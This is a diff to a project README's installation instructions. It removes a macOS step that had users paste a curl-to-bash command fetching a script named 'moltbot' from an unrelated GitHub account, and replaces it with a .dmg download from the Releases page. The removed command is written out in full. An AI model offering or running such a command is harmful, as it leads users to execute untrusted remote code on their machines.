@@ -129,24 +129,20 @@ Thanks to our optimizations, you have complete freedom of choice:
 
 ## Installation
 
-### 🟢 1-Click Install (Windows Portable)
+### 🟢 1-Click Install
 
 **The easiest way to get started.**
 
 1. Go to the [**Releases**](../../releases) page.
-2. Download the **Windows Portable** `7.z` file.
+2. Download the  `7.z` file.
 3. Extract the file.
 4. **Run.** (No extra setup required).
 
 ### MacOS
 
-- 💻Open **Terminal**
-- ☑Paste the **command** below
-- ✅Press **Enter**
-
-```sh
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/moltbot)"
-```
+- 💻Go to the [**Releases**](../../releases) page.
+- ☑Download the  `.dmg` file.
+- ✅**Run.**
 
 ### Supported Platforms
 
